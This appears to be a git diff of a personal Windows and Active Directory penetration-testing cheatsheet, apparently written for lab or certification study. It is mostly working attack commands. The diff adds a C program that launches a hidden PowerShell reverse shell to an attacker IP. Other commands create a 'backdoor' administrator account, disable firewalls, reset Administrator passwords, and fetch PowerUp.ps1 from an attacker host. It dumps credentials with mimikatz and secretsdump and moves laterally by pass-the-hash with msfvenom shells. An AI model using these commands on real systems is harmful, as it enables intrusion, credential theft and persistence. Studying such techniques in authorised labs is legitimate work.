@@ -41,7 +41,7 @@ There are several key pieces of information we should always obtain:
 > Get-Process NonStandardProcess | Select-Object Path # Get the path of the process
 # Sensitive information may be stored in meeting notes, configuration files, or onboarding documents. With the information we gathered in the situational awareness process, we can make educated guesses on where to find such files.
 > Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-> Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+> Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 # If you get access to the machine through another user, then restart the file search, as permissions may have changed
 > Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue | type # Great, but only for CTFs, probably shouldn't get used to it
 > findstr /spin “password” *.* # find all files with the word "password" in them
@@ -84,7 +84,7 @@ powershell -ep bypass
 > Get-NetComputer -FullData # '| select {propertyName}' in order to nail down certain information, such as operating system
 > Get-NetComputer | select operatingsystem,dnshostname # It's a good idea to grab this information early in the assessment to determine the relative age of the systems and to locate potentially weak targets.
 # Map a computer to an IP address
-> Resolve-IFAddress dev04.medtech.com
+> Resolve-IPAddress dev04.medtech.com
 # Enumerate groups
 > Get-NetGroup | select cn
 # Get the groups of a user
@@ -113,7 +113,7 @@ ndows 11
 # Attempt to resolve SPN's IP
 > nslookup.exe web04.corp.com # Typically located in C:\Tools\
 # Enumerate ACEs, filtering on an identity
-> Get-ObjectAcl -Identity stephanie # Look for AD Rights, SIDs. SID2 has AD Rights to SID1
+> Get-ObjectAcl -Identity stephanie # Look for AD Rights, SIDs. SID has AD Rights to SID
 # Convert SIDs to domain object name
 > Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
 # Clean output, look for all users with General All Rights for either a user or group object, can change permissions and change their passwords if user
@@ -135,7 +135,7 @@ Note that SharpHound supports looping, running cyclical queries over time like a
 ```bash
 > . .\Sharphound.ps1 # or Import-Module .\SharpHound.ps1
 > Get-Help Invoke-BloodHound
-> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\Desktop\ -OutputPrefix "web02" # May take a couple minutes
+> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Public\Desktop\ -OutputPrefix "web02-nt" # May take a couple minutes
 ```
 
 ```bash
@@ -346,7 +346,7 @@ You can use this user to RDP into a session and obtain a GUI. This assumes that 
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 
 # Enables RDP Pass the Hash
-Net-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
 
 # Enables RDP Connections
 reg add "HTLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \v "fDenyTSConnections" /t REG_DWORD /d 0 /f
@@ -354,14 +354,13 @@ reg add "HTLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \v "fDenyTSConne
 # Disable the Firewalls
 netsh advfirewall set allprofiles state off
 ...
-net user /add backdoor Password1
-...
+net user /add backdoor Password123
 net localgroup administrators /add backdoor
-...
+net localgroup "Remote Desktop Users" backdoor /add
 net localgroup "Remote Desktop Users" backdoor /add
 
 # RDP In & Allow Clipboard Sharing
-xfreerdp /v:ms01 /u:backdoor /p:Password1 +x clipboard /cert:ignore
+xfreerdp /v:web02 /u:backdoor /p:Password123 +x clipboard /cert:ignore
 ```
 
 #### Collecting Data for Bloodhound on Windows
@@ -403,13 +402,6 @@ NTLM hashes can be passed, NTLMv2 hashes CANNOT be passed.
 > Get-Content file.txt | Select-String -Pattern OS -Context 2,4
 ```
 
-#### Execution Policy Bypass - Per script basis
-
-```bash
-# Simply append to your script
--ExecutionPolicy Bypass
-```
-
 #### Execution Policy Bypass - Per User Basis
 
 ```bash
@@ -447,7 +439,7 @@ scp C:\path\to\file.txt kali@<KALI_IP>:/path/to/save/
 #### Change User's Password
 
 ```bash
-Set-LocalUser -Name "backdoor" -Password (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
+Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Password123!" -Force)
 ```
 
 #### Windows' Curl
@@ -500,7 +492,24 @@ int main ()
   return 0;
 }
 ```
+or
+```c
+#include <stdio.h>
 
+int main() {
+    int i;
+    // Reverse shell command to your attacker machine
+    i = system("powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object "
+               "System.Net.Sockets.TCPClient('192.168.45.225',445);$stream = $client.GetStream();"
+               "[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"
+               ";$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
+               "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
+               "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
+               "$stream.Flush()};$client.Close()");
+    return 0;
+}
+
+````
 You need to cross-compile the code on our Kali machine with mingw-64.
 
 ```bash
@@ -547,7 +556,7 @@ Once you're back, confirm that everything went as planned.
 Get-LocalGroupMember administrators
 ```
 
-We can nor use *RunAs* to obtain an interactive shell. In addition, we could also use msfvenom to create an executable file, starting a reverse shell.
+We can now use *RunAs* to obtain an interactive shell. In addition, we could also use msfvenom to create an executable file, starting a reverse shell.
 
 If you run into trouble after priv escing, try running a powershell and cmd prompt as an administrator from the get. 
 
@@ -577,6 +586,27 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 # Check for permissions on the binary if you find an interesting one
 icacls .\Documents\BetaServ.exe
 ```
+
+```bash
+To identify and restart services using a specific DLL file on Windows, you can follow these steps:
+ 1 Identify the Services:
+    • Open Command Prompt as Administrator.
+    • Use the tasklist /m wlbsctrl.dll command to list all processes using the  
+      wlbsctrl.dll file.
+ 2 Find Service Names:
+    • For each process identified, use sc query ex type= service state= all |    
+      find /i "PROCESS_NAME" to find the corresponding service name, replacing  
+      PROCESS_NAME with the actual process name.                                
+ 3 Restart Services:
+    • Once you have the service names, use net stop "ServiceName" followed by   
+      net start "ServiceName" for each service, replacing "ServiceName" with the
+      actual name of the service you want to restart.     
+sc query | findstr /i "auditTracker"
+sc query | findstr /i "SERVICE_NAME"
+sc qc <ServiceName> | findstr /i "BINARY_PATH_NAME"
+net stop <ServiceName> && net start <ServiceName>
+sc stop <ServiceName> && sc start <ServiceName>
+````
 If you have read and execute permissions (RX), then see if there is a missing DLL for the binary.
 
 You can use Process Monitor to display real-time information about any process, thread, file system, or registry related activities. Our goal is to identify all DLLs loaded by BetaService as well as detect missing ones. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. Alternatively, if find that a DLL is missing, we could try to provide our own DLL by adhering to the DLL search order.
@@ -688,7 +718,7 @@ net localgroup administrators # Verify the executable worked
 
 Don't forget to put everything back where it was. :)
 
-*Automated Unquoted Service Paths Exploitation*
+**Automated Unquoted Service Paths Exploitation**
 
 ```bash
 iwr http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
@@ -762,7 +792,7 @@ Start-Process -NoNewWindow -FilePath C:\Windows\Tools\shell.exe
 Check for this in PowerUp's Invoke-AllChecks output. Follow the steps listed in "https://github.com/CsEnox/EventViewer-UACBypass". For the command, execute a msfvenom payload for a proper reverse shell, such as
 
 ```bash
-Invoke-EventViewer "C:\Windows\Tools\shell.exe"
+Invoke-EventViewer "C:\Windows\Tasks\shell.exe"
 ```
 
 #### When you Become Local Admin
@@ -772,9 +802,11 @@ Run all MimiKatz commands and save the output:
 ```bash
 .\mimikatz.exe
 token::elevate # Makes sure commands are run as system
+token::elevate /domainadmin
 privilege::debug # Test if ^ is the case
 log
 sekurlsa::logonpasswords # Who has been on the host machine?
+sekurlsa::msv
 lsadump::sam
 lsadump::secrets
 lsadump::cache
@@ -791,6 +823,17 @@ crackmapexec smb 10.10.10.15-24 -u '' -H 5bcoe56i4645ho43h2ei534rsat -d corp.com
 
 # You can also use with a username, such as Administrator
 crackmapexec smb 10.10.10.15-24 -u 'Administrator' -H 5bcoe56i4645ho43h2ei534rsat --local-auth --lsa
+
+# This one worked
+crackmapexec smb 10.10.10.15 -u 'Administrator' -H 5bcoe56i4645ho43h2ei534rsat -d svcorp --continue-on-success
+
+proxychains -q crackmapexec smb files02 -u joe -p Flowers1 --spider ADMIN$ --regex .
+```
+
+Execute remote commands:
+
+```bash
+crackmapexec winrm -u 'pete' -H <ntlm hash> --local-auth
 ```
 
 Kerberos:
@@ -824,22 +867,18 @@ $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 
 # Create a PSCredential object with an account that has permissions to reset   
 passwords                                                                      
-$Cred = New-Object System.Management.Automation.PSCredential                   
-('DomainName\UserName', (ConvertTo-SecureString 'FGjksdff89sdfj' -AsPlainText  
--Force))                                                                       
+$Cred = New-Object System.Management.Automation.PSCredential('web02.dmz.medtech.com\\Administrator', (ConvertTo-SecureString 'FGjksdff89sdfj' -AsPlainText -Force))
 
 # Reset the password for the user 'nina'                                       
-Set-DomainUserPassword -Identity 'nina' -AccountPassword $UserPassword         
--Credential $Cred -Verbose                                                     
+Set-DomainUserPassword -Identity 'Administrator' -AccountPassword $UserPassword -Credential $Cred -Verbose                                                     
 
 # If you need to set the password for another user, repeat the process with the correct details
 # For example, for a user named 'User.Name':
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('DomainName\User.Name', $SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('web02\Administrator', $SecPassword)
 
 # Reset the password                                                           
-Set-DomainUserPassword -Identity 'User.Name' -AccountPassword $UserPassword    
--Credential $Cred -Verbose
+Set-DomainUserPassword -Identity 'Administrator' -AccountPassword $UserPassword -Credential $Cred -Verbose
 
 # Optionally, if you need to set a script path for the user object             
 # Replace <User.Name>, $ip, <file> with actual values                          
@@ -855,14 +894,67 @@ impacket-atexec -k admin02.corp.com "powershell -enc <command>"
 # With password
 impacket-psexec "web02/administrator:<password>@web02.corp.com" -c <path to binary>
 # Get a shell with ntlm hash
-impacket-psexec 'web02/administrator'@10.10.10.15 -hashes ':5bcoe56i4645ho43h2ei534rsat'
+impacket-psexec 'web02/administrator'@10.10.10.15 -hashes ':5bcoe56i4645ho43h2ei534rsat' # maybe take quotes off of domain/user
 # Dump secrets from kali machine
-impacket-secretsdump svcorp/pete 
+impacket-secretsdump svcorp/pete@10.10.10.15 -hashes ':5bcoe56i4645ho43h2ei534rsat'
 # Using evil win-rm with hash
 evil-winrm -i 10.10.10.15 -u pete -H 5bcoe56i4645ho43h2ei534rsat
+upload msfvenom_shell.exe # For a better shell
+C:\Windows\Tools\msfvenom_shell.exe # Execute executable
 ```
 
 #### Amazing Enumeration Cheatsheet
 
 https://wadcoms.github.io
 
+#### After You Compromise DC
+
+Do dcsync to get hashes of all of the domain controllers. Be persistant. 
+
+#### Installing OpenSSH
+
+Run as admin in powershell:
+
+Check if OpenSSH is available by running the following command:
+```bash
+Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
+```
+
+Install the OpenSSH Server component by running the following command:
+
+```bash
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+```
+
+#### RDP From PowerShell
+
+```bash
+Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:client01.medtech.com"
+ ```
+
+ #### Pass the Hash
+
+ If you can't crack the NTLM hash, you can always pass it. This resource walks you through it, 'https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash'. 
+
+ #### Other Resources
+
+ "https://dmcxblue.gitbook.io/red-team-notes/lateral-movement/pass-the-hash"
+
+ #### Recursively Look for a Word
+
+```bash
+Get-ChildItem -Path C:\Users -Recurse| Select-String -Pattern "password" | Select-Object Path, LineNumber, Line
+```
+
+#### For Modifiable Executables but Unknown Process, Watch What's Going on
+
+```bash
+Get-Process | Watch-Command -Diff -Cont -Verbose
+Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Verbose
+```
+
+#### Switch File Permissions
+
+```bash
+icacls "C:\Windows\Tasks\file.log" /grant Everyone:F
+```
